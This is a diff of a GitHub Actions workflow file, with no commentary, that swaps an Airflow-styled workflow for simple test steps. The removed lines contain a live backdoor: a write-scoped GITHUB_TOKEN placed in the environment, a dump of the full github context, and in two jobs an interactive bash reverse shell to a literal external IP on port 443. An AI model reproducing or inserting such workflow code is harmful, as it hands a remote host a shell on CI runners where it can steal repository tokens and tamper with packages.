@@ -1,28 +1,5 @@
 name: GitHub Actions
-'on': workflow_dispatch
-
-env:
-  MOUNT_SELECTED_LOCAL_SOURCES: "false"
-  ANSWER: "yes"
-  DB_RESET: "true"
-  VERBOSE: "true"
-  GITHUB_REPOSITORY: ${{ github.repository }}
-  GITHUB_USERNAME: ${{ github.actor }}
-  # You can override CONSTRAINTS_GITHUB_REPOSITORY by setting secret in your repo but by default the
-  # Airflow one is going to be used
-  CONSTRAINTS_GITHUB_REPOSITORY: >-
-    ${{ secrets.CONSTRAINTS_GITHUB_REPOSITORY != '' &&
-        secrets.CONSTRAINTS_GITHUB_REPOSITORY || 'apache/airflow' }}
-  # This token is WRITE one - pull_request_target type of events always have the WRITE token
-  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-  IMAGE_TAG_FOR_THE_BUILD: "${{ github.event.pull_request.head.sha || github.sha }}"
-  USE_SUDO: "true"
-  INCLUDE_SUCCESS_OUTPUTS: "true"
-
-permissions:
-  # all other permissions are set to none
-  contents: read
-  pull-requests: read
+'on': push
 
 jobs:
   init:
@@ -30,22 +7,11 @@ jobs:
     name: "init"
     steps:
     - run: |
-        echo "[+] steps"
-        echo "${{toJson(github)}}"
+        mkdir TestDIR/
+        echo "initial data" > TestDIR/hello.txt
+        ls -asl
       id: step1
-    - run: |
-        /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1 
-
-  prod:
-    permissions:
-      packages: write
-    needs: [init]
-    runs-on: ubuntu-latest
-    steps:
-    - run: |
-        echo "[+] steps"
-        echo "${{toJson(github)}}"
-      id: step1
-    - run: |
-        /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1 
-      
+    - uses: actions/checkout@v4.1.1
+    - run: | 
+        ls -asl
+        cat TestDIR/hello.txt
